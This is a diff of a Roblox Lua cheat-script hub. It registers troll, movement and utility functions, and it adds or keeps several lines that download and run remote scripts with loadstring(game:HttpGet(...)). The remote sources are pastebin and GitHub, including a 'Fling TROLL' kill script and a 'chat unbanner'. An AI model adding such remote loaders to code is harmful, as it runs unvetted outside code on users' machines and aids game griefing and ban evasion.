@@ -413,48 +413,10 @@ FunctionManager.OnFunctionAdded.Event:Connect(updateGrid)
 -- Initialize
 updateGrid()
 
-FunctionManager:register("FE script", function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/Dvrknvss/UniversalFEScriptHub/main/Script'))()
-end, "Troll", "Créditos ao criador original!")
+FunctionManager:register("em breve", function()
 
-	local s = Instance.new("Sky")
-	s.Name = "Sky"
-	s.Parent = game.Lighting
-	local skyboxID = 8408806737
-	s.SkyboxBk = "http://www.roblox.com/asset/?id="..skyboxID
-	s.SkyboxDn = "http://www.roblox.com/asset/?id="..skyboxID
-	s.SkyboxFt = "http://www.roblox.com/asset/?id="..skyboxID
-	s.SkyboxLf = "http://www.roblox.com/asset/?id="..skyboxID
-	s.SkyboxRt = "http://www.roblox.com/asset/?id="..skyboxID
-	s.SkyboxUp = "http://www.roblox.com/asset/?id="..skyboxID
-	game.Lighting.TimeOfDay = 12
-
-	for i, v in pairs(game.Players:GetChildren()) do
-		local emit = Instance.new("ParticleEmitter")
-		emit.Parent = v.Character.Torso
-		emit.Texture = "http://www.roblox.com/asset/?id=8408806737"
-		emit.VelocitySpread = 20
-	end
-	for i, v in pairs(game.Players:GetChildren()) do
-		local emit = Instance.new("ParticleEmitter")
-		emit.Parent = v.Character.Torso
-		emit.Texture = "http://www.roblox.com/asset/?id=8408806737"
-		emit.VelocitySpread = 20
-	end
-	for i, v in pairs(game.Players:GetChildren()) do
-		local emit = Instance.new("ParticleEmitter")
-		emit.Parent = v.Character.Torso
-		emit.Texture = "http://www.roblox.com/asset/?id=8408806737"
-		emit.VelocitySpread = 20
-	end
-	while true do
-		game.Lighting.Ambient = Color3.new(math.random() , math.random() , math.random())
-		wait(0.2)
-		game.Lighting.ShadowColor = Color3.new(math.random() , math.random() , math.random())
-		wait(0.2) 
-	end
 end, "Troll", "NOT FE")
-FunctionManager:register("FE ", function()
+FunctionManager:register("FE John doe", function()
 
 	local redSkyboxAssetId = "rbxassetid://rbxassetid://1012887"
 	local sky = Lighting:FindFirstChildOfClass("Sky")
@@ -1562,16 +1524,10 @@ FunctionManager:register("Spin Bot", function()
 end, "Visual", "Speeeeen")
 
 FunctionManager:register("TP To Mouse", function()
-mouse = game.Players.LocalPlayer:GetMouse()
-tool = Instance.new("Tool")
-tool.RequiresHandle = false
-tool.Name = "Tp tool(Equip to Click TP)"
-tool.Activated:connect(function()
-local pos = mouse.Hit+Vector3.new(0,2.5,0)
-pos = CFrame.new(pos.X,pos.Y,pos.Z)
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
-end)
-tool.Parent = game.Players.LocalPlayer.Backpack
+	if hit then
+		HRP.CFrame = CFrame.new(pos + Vector3.new(0, 3, 0))
+		warn("Teleported to mouse")
+	end
 end, "Movement", "BUGGED")
 FunctionManager:register("Save Position", function()
 	savedCFrame = HRP.CFrame
@@ -1854,7 +1810,7 @@ FunctionManager:register("chat unbanner", function()
 	loadstring(game:HttpGet("https://pastebin.com/raw/aDFhvMC4", true))()
 end, "Utility", "Créditos ao criador original!")
 FunctionManager:register("Fling TROLL", function()
-	loadstring(game:HttpGet("https://pastebin.com/raw/pidpD7N4", true))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/siriguela820/Siriguela-hub-V1/refs/heads/main/Siriguela%20kill", true))()
 end, "Troll", "Créditos ao criador original!")
 
 --init
